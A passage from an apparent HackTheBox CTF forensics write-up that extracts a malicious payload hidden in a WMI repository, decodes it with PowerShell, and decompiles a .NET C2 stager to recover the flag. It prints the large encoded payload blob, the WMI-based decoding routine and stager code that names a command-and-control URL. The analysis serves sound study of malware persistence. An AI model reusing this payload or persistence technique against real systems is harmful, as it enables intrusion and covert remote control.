6d5a4f517a4d436e704965666b7a34383733754c2b56493636474838576f58684a546e726c35352f4a442f64372b4f636250417750435468647556574c2b2f454e2b562b43506b746f36633854336b714a4b3641386d436a42344372394d65696a4c364b6261774166773235514f487451464b6c354e705352722b536c41636e743641686351776e395662584c594466634a3041764d353369374b44766b59784a5154354c47433368416e416732794937746a516a446f513941464a6659702b354461554a657248536c5a52614d3757704d65774877723962614d7436314d57496673332b5675544f337a663833785963644e504a48573737386565515643764e532b74344b484c4e6b57507170324b683870616d487147444e39314f427637576d796233334d33437839643731434866432b67777364626c717a3436575a4a665a672b526e63717144684a336265685138307167534c4e414433756150727045624645375157314c6b2b5a6f4d726b4c6e693944462b542f664a44696638584e794f3937474c4f6b79726a333546384965457879666d596836556a50753632312f6c736f622b58306d646f43543648474a705651527178587873422f6451753866736b624a43777834454a635374646f6976654e4c314b3533796e63656f30717838482f7172334d396a7258346f6e4945324c4a306d49507555704770617a4572525050414d37643773755150705a31374e55497470644c3941684f717138524a723469486746734e5431633841762b31344876496a4b4f6f613572314f4459417452344739527533675562776b39346b4d75457533696264556a4e444773726847396f746b4e54447a7171684b5836466e7646764366702b3269525053356d73463530647368446f6c7864342b49437662326b48433739346d373649443367506753745a654d414b3870475163734c7a6b6d62684d4e33754d6949545a3664624765664b6f70716d6d4c37336267732b3437594f336e766f2b4b427a6c7136482f432b326c786e2f676637774f517476676546734e30702b384c3442397950594a5a662b4a37544e77766471504f3259636e77442f6865684a52664d4c31546468354533593038524a7876443249496b6f3766552b443839652b37654a4c34716879416642745a4f4178385550667634696e785162784d75445436732f45425a465758784d7669572b4c7438516c63646e7a4b37464958784158614a455742476634576538563853712b4878647669697569544c6c4555572b4638696248447334585856584b65726b7674394e64337244794b7a4872337161554b4b387246326739315967573553347076642b4233413933795435346a4c68766e715235374f4d576171494c536974362f6a4f413554693157326b546655765a523358675079796c33354c7732784a656c4c414d4a3978755a555278795a3841502f5838425470554a616138674864545570775637764e587651445339317746762b6e46353644796868794c65576e336374346d2b635046685235777939397a386d6f4b7a714f506f4d362f777149396533754f482b3838336b5a37426862305744616a543253697337713564397268376f30645037342f596157543063582b5a4e5379624b6163303737696e485961486b686c3533557a4f70335554375454534d4c4b5948446d644b773470344d4773366e59695257464e445461327a3878314e765276594e6d39637a7871636e425857794e396f776138577853333074444e4c466f5a66543531754562615572714442386d7978344f36436c346b74474278714f5a4b4d31624d634e4d4a715935734e793066694f5a31474f5a684a47795771562b496b596a526a524f76664834536a6f5461543257694359545a2f51346a656d6e44325154636472546278676e4533712f6b637045457a4378392b54783433335232456d385a77776d3943527370644e364b6b376a4f6a495a3036575843444a3263744a6b6b7231464f446f646a4d626a6d4350782f6b5236546a636c7975716a756d55684b395276366e45396c5945482f6448596e45374471565047535a32576b6b3744764747474a5846345a426b596a35694a6a4434433136517475433378415373575465733067615244766e6a514e444a477a45684f4c6a497a46376b4a4b3946304a6f7478564d2f4d4766472b714b575476515a3762414965375737723664664e5447496d45554f3632556b654a695a374a2b6541786e737a654f65617a724c456d45386e6b72715a32356b43305835394f6a7337793235667252376c7a492f7279656943784b776c2b586757715a6a5857513269365551535953784a6e584b697673574d48666a6861444b7230796b4a752b64766d3763366232747650524e4c744f6f4c39693434473442307867794a54466b36423359776b556f784f57676138787a2f6a6937374c5a496d6a534a79763345366c5554784f4f5255756f41346f476659314644556d737450506a71667a4f4e4c616734326b5a3232624777306d6f6e4e79575167484459412f4a536569716279466f76436f536b7a51646853314e75386b64454c6467594a534d526c4576756a796551304b6c4347506147627033547a3366565171696c72786a446e42784f70614249767865434e365a6e54686e6c7971535964613858315a44636c71736b704b677a7a387a6f69692f556d5a77316f7a733154723757637833457455655052564e79594a36635038743751634c2b356d4d34595334772b4178556654534670695a52646d584f4d78535230796e70636e3345616d736169383771736936556d70774f6d6b55305830456630365347554d564b3078427459694f6c7069646c744d5a79614d65794a7555585159376352466a6470664b4c58397049546e596a70794d7970424d795276644e39325553534b51746e4249612b374d774d797878644935484b6a455a54664352533051474a3156442b4473343576756f556b7074784e57395358386a49303843654d6d436168736b3135787767475642327073657938395035506757334e575a444f64674e766c2b50796168794e4c72476f56473375537a735430526e55346156536351735873644f6c6b573975705866444c754a57334e6e67784f34355a77497a6f4549645453516a4d61696d445043494a395765564f35306d7531307a317252744e7a69363158485539794770384a466b314c4744567848527865716d4c4c7a6c77427a616e617238394573386e4d73707133745846514f41714645696676656638342b79692b3257777961673473704530554d78396f3072367348527531697733547254514f5742526f68716b4a4b336e5153435a6969334c544c4e4c7441556357322b47314542304e6f6763777a4e6a446a644f336f6c36527571516362433851416965544a7449344c386e4f4b55713850356d41337a6a375469564d497a5850754b797172476e6d63514e375263362b6b334e4b79414f4759677a773034674875434c486f55776d4463506a2b6d315a336370773267756f53594e66446d67554a396b592f316d34494555347547623142656f317a656969585063476656466d6d636433323271634935592b503531634a486c413952767052544c5378776475793062355277506a77796b395279326c4932394e726f6232584c4458733746686547316a42585751352f476e66494947615a7a365361637a7747596f5474522b674762704e4c416a654177386737672f484d574e65644c524f494d5a5a3844706f44527548444769756b35775a6d684d616f37684f304264314559335157754d6b436c6f556b55334f45656866776932522b6b414c5543584f7563677a38444f62726f573333624d32306d7447486468446f38376e5845587448634474764856702f4d774c493152456d736e494f7644536831306d4c4c77725a66656a32387a56756e416a464f34675852414c346e4c34393254434b6948646f423142497462754b684d7743426539656857544a756c472b422b484b354d45773574544931544a787a46547a684d50345278444974315965594e6d4e6548627779766348327763784f576a6b506e474a32556f635352547259376976426a6349724859394c2b414f5444304236513068486f38587a324a345035772b4462646a70416e334c5732512f35454630506568703655786a4877427551647676687a794c47577a47334b782f48464f5950496f5a6a534e4c313847634536302f4a72566945466f2b7a2b535164426e5549306a5a676b334a4d306b46674a7a454f4144734b543459676d354c3044435357584745312f556b5a32786a4759617a456b5139544e2b677a3448644b506d38516e662f6b694c4e6a49316a694d4d516a63702b79534f594230427a4d504d334250416439576a713730677a65706d4e796d37497954654e77647a70664138746e634a317931585169364f557a36507a664a44424545554550476f4a4c70784d75374d415968314950766d3367374a493131496d48693355587a45334c386f776a3067374d3277597343724e523244714c476566417761474878304946475a5143667964303257614c7444714e465673777478735a316d46564279384b664270597431795036375946613362496c4c42764f30454a6c782b46336236487549766d45646c65386c50592b544b5846654e46334356704273357732656e4564784664646f6b42795246414533676364385539364d6c4376554c723136356f66772f63347a4e6a635a5656302b2b78576e7246655877326846656446336253584f78646f522b3274376b63305a6f5a2b4a32556d30495658544c6c55615335452f7078535a477268635435723536463461306f79436c5538583567752f485953323146655731464e532f435956314b7a6d49507a306e754b4469382b7a6e396a72772b3933364f32356e6e4471416959676947625755774e79347457504a6b6d485773383479752f497768615053692b334f5362696b3568792b356345435739694e30417a325a3441426437385054444f375a664353733134344878374c6e5a73776e467834505230736532776f657278307062597251646251646e7069776d59575062614261715a456153486a74714a667274426670644b796f3031476b30376d69546d65525474654b4f6c31464f743072366e5176365a5157526b4b6c6854345855683146564763523156564564574f396c395767324632792f2b756474317973652f58464e6e4b486866433577695138514454746d4c636c754435595578486349674a5867554167574238493148674377595a675337433978734e664d4e6443457243705949506b4f534b7475304c727754776650734833773336774a714347525532677872577554416732576b7356775556416c3138453149706751676b455047464656472b6f4c464d554b524b3241737471715661342f564468762b464244637536535367422f6a74494e304b51504a2f5051774b4c67786c7355446d6d382f66597733306359593348432f752b34506c50657142772f6e3645483141677741785047497748665745584f2b2f7a736164415043545843524f6a417147707a4b6970566f6c7466706d4834506e484f49754b745067454c345a42576e74437376374f5a6a33746b576e3068596e54556b34656d52315942686f4744636356685a63537776626c4f35774b5242736d4835672b42704a5370452f566d4253513462436239754c66583073657250516a487a382b4c77472f42492f68665044387a2b33685654577356466658564576392f31544a78627458346c5743766449374a4653366f415234763370745233364e41494b337331634366734b414342344b754c306965497746553846444c41694f75727843385833747a4d32484e335a64764d756c426b635656564855414c414e33747a6d496c303176482b696842536e71704342344b672f37466171673763456f3572756a6f44324365652f4f6462795877516d6c6441527648324f47616e386e5842797a6a524f5738496e6e442f76754f322f376e792b3444394466695033667a74582b4478532b4a386d43572f6475437a6f386a347266344f6c363633785a464c4b72745254654e2f4b527637775766327a7a2f353734542f762b6c3037386f6650372b4c7a66773d3d00 | xxd -r -p &gt; shellcode.bin
strings shellcode.bin
# Win32_MemoryArrayDevice
# Property
# string
# 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</code></pre>
<p>The last string looked like base64, but it didn’t return anything
meaningful.</p>
<h2 id="decoding-the-byte-array">Decoding the byte array</h2>
<p>I was being lazy but now this challenge will be easier on Windows.
The whole parsing &amp; unpacking above can be achieved with native
tools on Windows.</p>
<p>We just need to replace the current WMI repository to operate on the
given files. From a privileged Powershell prompt:</p>
<pre class="shell"><code>Copy-Item -Path &#39;C:\Windows\System32\wbme\Repository&#39; -Destination &#39;C:\Windows\System32\wbme\Repository.000&#39; -Recurse
Winmgmt /resetrepository
Stop-Service Winmgmt
Move-Item -Path &#39;C:\Users\User\Downloads\Perseverance&#39; -Destination &#39;C:\Windows\System32\wbme\Repository&#39;
Start-Service Winmgmt</code></pre>
<p>Then we can just run the payload’s logic in a script and save the
byte array to a file:</p>
<pre class="shell"><code>$file = ([WmiClass]&#39;ROOT\cimv2:Win32_MemoryArrayDevice&#39;).Properties[&#39;Property&#39;].Value;
sv o (New-Object IO.MemoryStream);
sv d (New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($file),[IO.Compression.CompressionMode]::Decompress));
sv b (New-Object Byte[](1024));
sv r (gv d).Value.Read((gv b).Value,0,1024);
while((gv r).Value -gt 0){
  (gv o).Value.Write((gv b).Value,0,(gv r).Value);
  sv r (gv d).Value.Read((gv b).Value,0,1024);}
# New FileStream to some file
$fs = new-object IO.FileStream(&quot;C:\Users\User\Desktop\blobrunner\shellcode.bin&quot;, [IO.FileMode]::Append);
(gv o).Value.WriteTo($fs);
$fs.Close();</code></pre>
<h2 id="decompiling-the-stager">Decompiling the stager</h2>
<p>I tried to run the shellcode in <a
href="https://github.com/OALabs/BlobRunner">BlobRunner</a> but it felt
like too much of a hassle.</p>
<p>Instead, it can decompiled by dnSpy since it is a .Net assembly:</p>
<p><img src="images/cff-shellcode-analysis.png" /></p>
<p>dnSpy can even export the code as a VStudio project! The entrypoint
is called <code>GruntStager</code> and it starts with:</p>
<div class="sourceCode" id="cb12"><pre
class="sourceCode csharp"><code class="sourceCode cs"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="dt">void</span> <span class="fu">ExecuteStager</span><span class="op">()</span></span>
<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a>      <span class="kw">try</span></span>
<span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a>      <span class="op">{</span></span>
<span id="cb12-5"><a href="#cb12-5" aria-hidden="true" tabindex="-1"></a>        StringBuilder stringBuilder <span class="op">=</span> <span class="kw">new</span> <span class="fu">StringBuilder</span><span class="op">().</span><span class="fu">Append</span><span class="op">(</span><span class="st">&quot;SFRCezFfd&quot;</span><span class="op">);</span></span>
<span id="cb12-6"><a href="#cb12-6" aria-hidden="true" tabindex="-1"></a>        stringBuilder<span class="op">.</span><span class="fu">Append</span><span class="op">(</span><span class="st">&quot;GgwdWdodF9XTTFfdzRzX2p1c&quot;</span><span class="op">);</span></span>
<span id="cb12-7"><a href="#cb12-7" aria-hidden="true" tabindex="-1"></a>        stringBuilder<span class="op">.</span><span class="fu">Append</span><span class="op">(</span><span class="st">&quot;3RfNF9NNE40ZzNtM2&quot;</span><span class="op">);</span></span>
<span id="cb12-8"><a href="#cb12-8" aria-hidden="true" tabindex="-1"></a>        stringBuilder<span class="op">.</span><span class="fu">Append</span><span class="op">(</span><span class="st">&quot;50X1QwMGx9&quot;</span><span class="op">);</span></span>
<span id="cb12-9"><a href="#cb12-9" aria-hidden="true" tabindex="-1"></a>        List<span class="op">&lt;</span><span class="dt">string</span><span class="op">&gt;</span> list <span class="op">=</span> <span class="st">&quot;http://147.182.172.189:80&quot;</span><span class="op">.</span><span class="fu">Split</span><span class="op">(</span><span class="kw">new</span> <span class="dt">char</span><span class="op">[]</span></span></code></pre></div>
<p>Finally a string starting with “SFR”!</p>
<pre class="shell"><code>echo -n SFRCezFfdGgwdWdodF9XTTFfdzRzX2p1c3RfNF9NNE40ZzNtM250X1QwMGx9 | base64 -d</code></pre>
<blockquote>
<p><code>HTB{1_th0ught_WM1_w4s_just_4_M4N4g3m3nt_T00l}</code></p>
</blockquote>
</article>
</body>
</html>
